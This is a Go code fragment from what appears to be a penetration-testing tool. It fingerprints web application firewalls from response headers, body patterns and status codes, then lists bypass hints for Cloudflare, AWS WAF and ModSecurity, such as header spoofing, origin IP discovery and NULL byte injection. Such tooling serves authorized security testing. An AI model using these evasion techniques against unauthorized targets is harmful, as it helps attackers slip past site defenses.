func (f *WAFFingerprinter) Fingerprint(headers map[string]string, body string, statusCode int) *WAFResult {
	var bestMatch *WAFResult
	bestScore := 0.0

	for _, sig := range f.signatures {
		score := 0.0
		indicators := make([]string, 0)
		count := 0

		for _, key := range sig.Headers {
			for hk, hv := range headers {
				if strings.EqualFold(hk, key) && (sig.Headers[key] == "" || strings.Contains(strings.ToLower(hv), strings.ToLower(sig.Headers[key]))) {
					score += 1.0
					indicators = append(indicators, fmt.Sprintf("header:%s=%s", hk, hv))
					break
				}
			}
			count++
		}

		for _, pattern := range sig.Patterns {
			if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
				score += 1.0
				indicators = append(indicators, fmt.Sprintf("body:%s", pattern))
			}
			count++
		}

		for _, code := range sig.ResponseCodes {
			if statusCode == code {
				score += 0.5
				indicators = append(indicators, fmt.Sprintf("status:%d", code))
			}
			count++
		}

		if count > 0 {
			confidence := (score * 2.0) / float64(count)
			if confidence > bestScore {
				bestScore = confidence
				hints := generateBypassHints(sig)
				bestMatch = &WAFResult{
					Detected:    confidence > 0.3,
					Name:        sig.Name,
					Confidence:  confidence,
					Indicators:  indicators,
					BypassHints: hints,
				}
			}
		}
	}

	if bestMatch == nil {
		return &WAFResult{Detected: false, Name: "Unknown"}
	}
	return bestMatch
}

func generateBypassHints(sig WAFFingerprint) []string {
	hints := []string{
		"Use HTTP parameter pollution (HPP)",
		"Try chunked transfer encoding",
		"Use Unicode/UTF-8 encoding variants",
		"Try HTTP/2 or HTTP/1.0 downgrade",
	}
	switch strings.ToLower(sig.Name) {
	case "cloudflare":
		hints = append(hints, "Try Cloudflare origin IP discovery via DNS history", "Use CF-Connecting-IP header spoofing")
	case "aws waf":
		hints = append(hints, "Try oversized headers (>8KB)", "Use AWS-specific encoding bypasses")
	case "modsecurity":
		hints = append(hints, "Try multipart/form-data boundary tricks", "Use NULL byte injection in parameters")
	}
	return hints
}

